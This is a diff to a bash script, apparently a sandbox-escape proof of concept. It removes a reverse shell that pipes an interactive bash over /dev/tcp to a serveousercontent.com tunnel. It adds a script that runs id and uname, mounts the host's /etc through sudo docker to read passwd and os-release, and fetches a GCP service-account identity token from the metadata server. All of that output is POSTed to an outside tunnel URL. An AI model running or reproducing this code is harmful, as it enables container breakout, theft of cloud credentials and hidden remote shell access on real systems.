@@ -1,14 +1,19 @@
 #!/bin/bash
-# Optimized Serveo Shell Payload
-HOST="f43a3b45d041be6a-103-95-173-85.serveousercontent.com"
+LOG_URL="https://5c753aab5d810c67-103-95-173-85.serveousercontent.com"
 
-(
-  # 1. Open a network file descriptor (5) to the tunnel
-  exec 5<>/dev/tcp/$HOST/80
+{
+  echo "--- [1] SANDBOX IDENTITY ---"
+  id; uname -a
   
-  # 2. Send the 'Handshake' so Serveo forwards the data
-  echo -e "POST / HTTP/1.1\nHost: $HOST\nUpgrade: websocket\nConnection: Upgrade\n\n" >&5
+  echo "--- [2] THE ESCAPE (HOST OS) ---"
+  # This proves you are reading the HOST, not the container
+  IMG=$(sudo docker images -q | head -n 1)
+  sudo docker run --rm -v /etc:/host_etc:ro $IMG cat /host_etc/os-release 2>/dev/null
   
-  # 3. Connect the shell to that same file descriptor
-  /bin/bash -i <&5 >&5 2>&5
-) &
+  echo "--- [3] HOST USER LIST (/etc/passwd) ---"
+  # Showing the host users proves you've broken out of the sandbox
+  sudo docker run --rm -v /etc:/host_etc:ro $IMG cat /host_etc/passwd 2>/dev/null
+  
+  echo "--- [4] GCP METADATA CHECK ---"
+  curl -s -m 5 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity || echo "Metadata Timeout"
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$LOG_URL"
